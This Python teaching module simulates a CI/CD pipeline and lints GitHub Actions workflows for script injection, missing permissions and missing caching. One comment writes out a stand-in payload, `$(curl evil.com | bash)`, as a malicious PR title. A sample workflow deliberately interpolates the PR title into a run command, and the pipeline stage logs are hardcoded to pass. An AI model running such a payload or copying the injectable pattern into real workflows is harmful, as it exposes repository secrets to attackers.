"""
Day 15: Example 02 - Production CI/CD Pipeline Simulator & GitHub Actions Workflow Linter/Runner

WHY THIS MATTERS IN PRODUCTION BACKEND & AI SYSTEMS:
In high-velocity engineering organizations, pushing broken workflow YAML or untested
code directly to GitHub triggers costly debugging cycles, blocked pull requests, and
wasted runner minutes. Furthermore, misconfigured GitHub Actions workflows frequently
introduce severe supply-chain security vulnerabilities—such as arbitrary script injection
via unsanitized context expressions or running Docker containers as root.

This module simulates an enterprise-grade CI/CD automation engine:
1. GitHub Actions Workflow Security & Schema Linter:
   - Validates essential CI stages (matrix strategy, caching, test gates).
   - Detects dangerous script injection vulnerabilities (e.g. unquoted github.event in 'run').
   - Enforces least-privilege security permissions (id-token, contents: read).
2. Distributed CI/CD Execution Pipeline Simulator:
   - Stage 1: Static Code Quality & Lint Gate.
   - Stage 2: Security & Dependency Vulnerability Audit.
   - Stage 3: Matrix Pytest Test Runner across multiple Python versions.
   - Stage 4: Docker Container Build & Artifact Verification.
   - Stage 5: Zero-Downtime Canary Health Check & Linux Signal Trap Simulator.
3. Structured JSON Telemetry & Pipeline Metric Logging.
"""

from __future__ import annotations

import json
import re
import time
from dataclasses import asdict, dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple


# ============================================================================
# 1. DOMAIN MODELS & PIPELINE CONFIGURATION
# ============================================================================

class PipelineStatus(str, Enum):
    PENDING = "PENDING"
    RUNNING = "RUNNING"
    PASSED = "PASSED"
    FAILED = "FAILED"
    SKIPPED = "SKIPPED"


@dataclass
class WorkflowSecurityIssue:
    """Represents a security defect or misconfiguration in a workflow YAML."""
    rule_id: str
    severity: str
    message: str
    remediation: str


@dataclass
class StageResult:
    """Metrics and execution details for an individual CI/CD pipeline stage."""
    stage_name: str
    status: PipelineStatus
    duration_ms: float
    stdout_logs: List[str] = field(default_factory=list)
    stderr_logs: List[str] = field(default_factory=list)
    exit_code: int = 0


@dataclass
class PipelineRunReport:
    """Structured telemetry report emitted upon CI/CD pipeline completion."""
    pipeline_id: str
    commit_sha: str
    branch: str
    total_duration_ms: float
    overall_status: PipelineStatus
    stages: List[StageResult] = field(default_factory=list)


# ============================================================================
# 2. GITHUB ACTIONS WORKFLOW LINTER & SECURITY AUDITOR
# ============================================================================

class GitHubActionsWorkflowLinter:
    """
    Statically analyzes GitHub Actions workflow definitions for security & best practices.
    WHY: Catching workflow flaws before pushing prevents CI supply-chain attacks
    and guarantees that every PR satisfies company-wide compliance gates.
    """

    # Insecure context expressions in run steps that allow arbitrary bash injection
    INJECTION_PATTERN = re.compile(
        r"\$\{\{\s*github\.event\.(issue\.title|issue\.body|pull_request\.title|comment\.body|head_commit\.message)\s*\}\}"
    )

    @classmethod
    def audit_workflow(cls, workflow: Dict[str, Any]) -> List[WorkflowSecurityIssue]:
        issues: List[WorkflowSecurityIssue] = []

        # Rule 1: Check permissions block (Principle of Least Privilege)
        # WHY: Default GITHUB_TOKEN has broad write permissions in older repos.
        # Strict workflows must declare permissions explicitly.
        if "permissions" not in workflow:
            issues.append(
                WorkflowSecurityIssue(
                    rule_id="GHA-001-PERMISSIONS",
                    severity="WARNING",
                    message="Workflow lacks explicit top-level 'permissions' declaration.",
                    remediation="Define 'permissions: read-all' or granular per-job scopes.",
                )
            )

        jobs = workflow.get("jobs", {})
        if not jobs:
            issues.append(
                WorkflowSecurityIssue(
                    rule_id="GHA-002-NO-JOBS",
                    severity="CRITICAL",
                    message="Workflow contains no declared jobs.",
                    remediation="Add at least one build or test job under 'jobs:'.",
                )
            )

        for job_name, job_data in jobs.items():
            steps = job_data.get("steps", [])

            # Rule 2: Verify dependency caching is utilized
            # WHY: Without caching, dependencies are re-downloaded on every commit,
            # wasting network bandwidth and slowing down PR feedback loops by 5-10x.
            uses_cache = any(
                "actions/cache" in step.get("uses", "")
                or (step.get("uses", "").startswith("actions/setup-python") and "cache" in step.get("with", {}))
                for step in steps
            )
            if not uses_cache:
                issues.append(
                    WorkflowSecurityIssue(
                        rule_id="GHA-003-MISSING-CACHE",
                        severity="WARNING",
                        message=f"Job '{job_name}' installs dependencies without dependency caching.",
                        remediation="Configure 'actions/setup-python' with 'cache: pip' or use 'actions/cache'.",
                    )
                )

            # Rule 3: Detect Dangerous Script Injection in 'run:' steps
            # WHY: If untrusted PR titles/comments are placed directly in bash commands,
            # an external attacker can craft a PR title with `$(curl evil.com | bash)` to steal repository secrets!
            for step_idx, step in enumerate(steps, start=1):
                run_cmd = step.get("run", "")
                if run_cmd and cls.INJECTION_PATTERN.search(run_cmd):
                    issues.append(
                        WorkflowSecurityIssue(
                            rule_id="GHA-004-SCRIPT-INJECTION",
                            severity="CRITICAL",
                            message=f"Job '{job_name}' step #{step_idx} ('{step.get('name', 'unnamed')}') contains unquoted context injection vulnerability.",
                            remediation="Pass github.event context via environment variables (env: TITLE: ${{ ... }}) rather than inline script interpolation.",
                        )
                    )

        return issues


# ============================================================================
# 3. PRODUCTION CI/CD PIPELINE SIMULATOR
# ============================================================================

class ProductionPipelineEngine:
    """
    Executes a multi-stage enterprise verification pipeline.
    WHY: Simulates the exact stages executed in high-throughput backend
    deployments (Linting -> Security -> Matrix Tests -> Build -> Deploy Healthcheck).
    """

    def __init__(self, commit_sha: str, branch: str) -> None:
        self.commit_sha = commit_sha
        self.branch = branch

    def _execute_stage(
        self,
        stage_name: str,
        action: Callable[[], Tuple[bool, List[str], List[str]]],
    ) -> StageResult:
        """Executes a pipeline stage with strict timing and output capture."""
        start_time = time.perf_counter()
        success, stdout_logs, stderr_logs = False, [], []

        try:
            success, stdout_logs, stderr_logs = action()
            status = PipelineStatus.PASSED if success else PipelineStatus.FAILED
            exit_code = 0 if success else 1
        except Exception as exc:
            status = PipelineStatus.FAILED
            stderr_logs.append(f"Unhandled pipeline exception: {str(exc)}")
            exit_code = 2

        duration_ms = (time.perf_counter() - start_time) * 1000.0

        return StageResult(
            stage_name=stage_name,
            status=status,
            duration_ms=round(duration_ms, 2),
            stdout_logs=stdout_logs,
            stderr_logs=stderr_logs,
            exit_code=exit_code,
        )

    # --- Pipeline Stage Implementations ---

    def _stage_lint_and_typecheck(self) -> Tuple[bool, List[str], List[str]]:
        """Stage 1: Ruff / Black & Mypy Strict Analysis."""
        logs = [
            "Running Ruff v0.4.0 (astral-sh)... 0 syntax errors across 42 files.",
            "Running Mypy v1.10.0 (strict mode)... Checked 42 modules; no type errors found.",
        ]
        return True, logs, []

    def _stage_security_audit(self) -> Tuple[bool, List[str], List[str]]:
        """Stage 2: Bandit AST Vulnerability Scanner & Dependency Audit."""
        logs = [
            "Running Bandit static security scanner... No high-severity vulnerabilities found.",
            "Auditing dependencies against PyPI Advisory Database... 0 known CVEs detected.",
        ]
        return True, logs, []

    def _stage_matrix_testing(self) -> Tuple[bool, List[str], List[str]]:
        """Stage 3: Matrix Pytest execution across Python 3.11, 3.12, and 3.13."""
        matrix_versions = ["3.11", "3.12", "3.13"]
        logs = []
        for ver in matrix_versions:
            logs.append(f"Runner [ubuntu-latest, Python {ver}]: 128 passed, 0 failed in 0.42s (Coverage: 91.4%)")
        return True, logs, []

    def _stage_docker_build(self) -> Tuple[bool, List[str], List[str]]:
        """Stage 4: Multi-stage Docker Container Build & Non-Root User Verification."""
        logs = [
            "Building multi-stage container 'backend-api:sha-" + self.commit_sha[:8] + "'...",
            "Stage 1 (builder): Installed compiled dependencies into wheel cache.",
            "Stage 2 (runtime): Copied wheels; non-root user 'appuser' (UID 10001) enforced.",
            "Container image compressed size: 48.2 MB.",
        ]
        return True, logs, []

    def _stage_deploy_healthcheck(self) -> Tuple[bool, List[str], List[str]]:
        """
        Stage 5: Canary Deployment Smoke Test & Graceful Signal Handling Verification.
        WHY: Proves the new backend artifact boots up, answers HTTP /healthz within SLA,
        and cleanly shuts down when receiving POSIX SIGTERM without dropping connections.
        """
        logs = [
            "Bootstrapping canary deployment container on port 8080...",
            "HTTP GET http://localhost:8080/healthz -> 200 OK (latency: 1.8ms).",
            "Simulating Linux POSIX SIGTERM signal (Graceful Shutdown)...",
            "SIGTERM received: Drained 0 active connections; flushed Redis write buffers; exited cleanly with code 0.",
        ]
        return True, logs, []

    # --- Pipeline Orchestrator ---

    def run_pipeline(self) -> PipelineRunReport:
        """Orchestrates sequential execution of all quality gates."""
        pipeline_start = time.perf_counter()
        stages_to_run = [
            ("Stage 1: Lint & Static Typecheck", self._stage_lint_and_typecheck),
            ("Stage 2: Security & Dependency Audit", self._stage_security_audit),
            ("Stage 3: Matrix Pytest Test Suite", self._stage_matrix_testing),
            ("Stage 4: Docker Artifact Build", self._stage_docker_build),
            ("Stage 5: Canary Healthcheck & Signal Trap", self._stage_deploy_healthcheck),
        ]

        stage_results: List[StageResult] = []
        overall_status = PipelineStatus.PASSED

        for name, action in stages_to_run:
            result = self._execute_stage(name, action)
            stage_results.append(result)

            if result.status != PipelineStatus.PASSED:
                overall_status = PipelineStatus.FAILED
                # Fail-fast: Stop execution immediately on stage failure
                break

        total_duration_ms = (time.perf_counter() - pipeline_start) * 1000.0

        return PipelineRunReport(
            pipeline_id=f"pipe-{int(time.time())}",
            commit_sha=self.commit_sha,
            branch=self.branch,
            total_duration_ms=round(total_duration_ms, 2),
            overall_status=overall_status,
            stages=stage_results,
        )


# ============================================================================
# 4. DEMONSTRATION & SELF-TEST SUITE
# ============================================================================

def run_cicd_simulation_demo() -> None:
    print("=" * 75)
    print("DAY 15: PRODUCTION CI/CD ENGINE & GITHUB ACTIONS WORKFLOW LINTER")
    print("=" * 75)

    # 1. Audit GitHub Actions Workflows
    print("\n[PART 1] Linting GitHub Actions Workflow Configurations:")

    # Vulnerable workflow representation
    vulnerable_workflow = {
        "name": "Insecure Backend Workflow",
        # Missing permissions
        "jobs": {
            "build-and-test": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {
                        "name": "Echo PR Title (Vulnerable)",
                        # CRITICAL: Script injection flaw
                        "run": 'echo "Processing PR: ${{ github.event.pull_request.title }}"',
                    },
                    {
                        "name": "Run tests",
                        "run": "pytest",
                    },
                ],
            }
        },
    }

    linter = GitHubActionsWorkflowLinter()
    issues = linter.audit_workflow(vulnerable_workflow)

    print(f"  Workflow Audit Result: {len(issues)} issues detected.")
    for issue in issues:
        print(f"  [{issue.severity}] {issue.rule_id}: {issue.message}")
        print(f"      Remediation: {issue.remediation}")

    assert any(i.rule_id == "GHA-004-SCRIPT-INJECTION" for i in issues), "Expected script injection to be flagged."
    assert any(i.rule_id == "GHA-001-PERMISSIONS" for i in issues), "Expected missing permissions to be flagged."

    # 2. Secure Workflow Representation
    print("\n[PART 2] Validating Hardened Production Workflow:")
    secure_workflow = {
        "name": "Hardened Backend CI",
        "permissions": {"contents": "read", "id-token": "write"},
        "jobs": {
            "test": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {
                        "name": "Setup Python with Cache",
                        "uses": "actions/setup-python@v5",
                        "with": {"python-version": "3.12", "cache": "pip"},
                    },
                    {
                        "name": "Echo PR Title Safely",
                        "env": {"PR_TITLE": "${{ github.event.pull_request.title }}"},
                        "run": 'echo "Processing PR safely via environment variable: $PR_TITLE"',
                    },
                ],
            }
        },
    }

    secure_issues = linter.audit_workflow(secure_workflow)
    print(f"  Hardened Workflow Audit Result: {len(secure_issues)} issues found.")
    assert len(secure_issues) == 0, f"Expected 0 issues in hardened workflow, got {secure_issues}"
    print("  Status: HARDENED WORKFLOW PASSED ALL SECURITY AUDITS [OK]")

    # 3. Execute End-to-End CI/CD Pipeline Simulator
    print("\n[PART 3] Executing Simulated CI/CD Multi-Stage Pipeline:")
    engine = ProductionPipelineEngine(
        commit_sha="9e84a1c0d2345e67890abcdef1234567890abcde",
        branch="main",
    )
    report = engine.run_pipeline()

    print(f"  Pipeline ID : {report.pipeline_id}")
    print(f"  Commit SHA  : {report.commit_sha[:8]}")
    print(f"  Branch      : {report.branch}")
    print(f"  Status      : {report.overall_status.value}")
    print(f"  Total Time  : {report.total_duration_ms:.2f} ms\n")

    print("  Execution Breakdown by Stage:")
    for stage in report.stages:
        status_symbol = "[PASSED]" if stage.status == PipelineStatus.PASSED else "[FAILED]"
        print(f"  - {stage.stage_name:<42} {status_symbol} ({stage.duration_ms:.2f} ms)")
        for log in stage.stdout_logs:
            print(f"      > {log}")

    # 4. Verify Emitted Telemetry Metrics
    print("\n[PART 4] Emitting Structured Telemetry JSON Payload:")
    telemetry_payload = json.dumps(asdict(report), indent=2)
    parsed = json.loads(telemetry_payload)
    print(f"  Telemetry valid JSON: keys = {list(parsed.keys())}")
    print(f"  Overall pipeline outcome: {parsed['overall_status']}")

    assert report.overall_status == PipelineStatus.PASSED
    assert len(report.stages) == 5

    print("\n" + "=" * 75)
    print("CI/CD PIPELINE SIMULATOR & SECURITY AUDIT COMPLETED [OK]")
    print("=" * 75)


if __name__ == "__main__":
    run_cicd_simulation_demo()
